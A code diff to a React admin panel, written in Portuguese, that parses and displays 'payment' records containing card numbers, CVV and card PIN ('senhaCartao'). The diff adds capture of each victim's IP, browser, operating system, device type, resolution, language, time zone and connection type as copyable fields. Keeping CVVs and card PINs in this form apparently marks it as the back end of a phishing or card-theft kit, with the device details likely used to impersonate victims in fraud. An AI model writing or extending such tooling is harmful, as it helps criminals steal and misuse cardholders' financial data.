@@ -65,11 +65,20 @@ const Admin = () => {
     cvv: string;
     senhaCartao: string;
     data: string;
+    // Device information
+    ip?: string;
+    navegador?: string;
+    so?: string;
+    dispositivo?: string;
+    resolucao?: string;
+    idioma?: string;
+    fuso?: string;
+    conexao?: string;
   }
 
   const [parsedData, setParsedData] = useState<ParsedPaymentData | null>(null);
 
-  const BACKEND_URL = 'http://localhost:5000';
+  const BACKEND_URL = 'http://localhost:5555';
 
   useEffect(() => {
     fetchPayments();
@@ -161,7 +170,15 @@ const Admin = () => {
       validade: '',
       cvv: '',
       senhaCartao: '',
-      data: ''
+      data: '',
+      ip: '',
+      navegador: '',
+      so: '',
+      dispositivo: '',
+      resolucao: '',
+      idioma: '',
+      fuso: '',
+      conexao: '',
     };
 
     for (const line of lines) {
@@ -179,6 +196,22 @@ const Admin = () => {
         data.senhaCartao = line.split('Senha do Cartão:')[1]?.trim() || '';
       } else if (line.includes('Data/Hora:')) {
         data.data = line.split('Data/Hora:')[1]?.trim() || '';
+      } else if (line.includes('IP:') && !line.includes('INFORMAÇÕES')) {
+        data.ip = line.split('IP:')[1]?.trim() || '';
+      } else if (line.includes('Navegador:')) {
+        data.navegador = line.split('Navegador:')[1]?.trim() || '';
+      } else if (line.includes('Sistema Operacional:')) {
+        data.so = line.split('Sistema Operacional:')[1]?.trim() || '';
+      } else if (line.includes('Tipo de Dispositivo:')) {
+        data.dispositivo = line.split('Tipo de Dispositivo:')[1]?.trim() || '';
+      } else if (line.includes('Resolução:')) {
+        data.resolucao = line.split('Resolução:')[1]?.trim() || '';
+      } else if (line.includes('Idioma:')) {
+        data.idioma = line.split('Idioma:')[1]?.trim() || '';
+      } else if (line.includes('Fuso Horário:')) {
+        data.fuso = line.split('Fuso Horário:')[1]?.trim() || '';
+      } else if (line.includes('Tipo de Conexão:')) {
+        data.conexao = line.split('Tipo de Conexão:')[1]?.trim() || '';
       }
     }
 
@@ -642,6 +675,73 @@ const Admin = () => {
                   fieldName="Data"
                 />
               </div>
+
+              {/* Informações do Dispositivo */}
+              {(parsedData.ip || parsedData.navegador || parsedData.so || parsedData.dispositivo) && (
+                <div className="pt-2">
+                  <h3 className="text-sm font-semibold text-muted-foreground uppercase tracking-wide mb-3 px-1">
+                    Informações do Dispositivo
+                  </h3>
+                  <div className="space-y-3">
+                    {parsedData.ip && (
+                      <CopyableField
+                        label="IP"
+                        value={parsedData.ip}
+                        fieldName="IP"
+                      />
+                    )}
+                    {parsedData.navegador && (
+                      <CopyableField
+                        label="Navegador"
+                        value={parsedData.navegador}
+                        fieldName="Navegador"
+                      />
+                    )}
+                    {parsedData.so && (
+                      <CopyableField
+                        label="Sistema Operacional"
+                        value={parsedData.so}
+                        fieldName="SO"
+                      />
+                    )}
+                    {parsedData.dispositivo && (
+                      <CopyableField
+                        label="Tipo de Dispositivo"
+                        value={parsedData.dispositivo}
+                        fieldName="Dispositivo"
+                      />
+                    )}
+                    {parsedData.resolucao && (
+                      <CopyableField
+                        label="Resolução"
+                        value={parsedData.resolucao}
+                        fieldName="Resolução"
+                      />
+                    )}
+                    {parsedData.idioma && (
+                      <CopyableField
+                        label="Idioma"
+                        value={parsedData.idioma}
+                        fieldName="Idioma"
+                      />
+                    )}
+                    {parsedData.fuso && (
+                      <CopyableField
+                        label="Fuso Horário"
+                        value={parsedData.fuso}
+                        fieldName="Fuso"
+                      />
+                    )}
+                    {parsedData.conexao && (
+                      <CopyableField
+                        label="Tipo de Conexão"
+                        value={parsedData.conexao}
+                        fieldName="Conexão"
+                      />
+                    )}
+                  </div>
+                </div>
+              )}
 
               {/* Action Buttons */}
               <div className="flex justify-end gap-2 pt-4 border-t border-border">
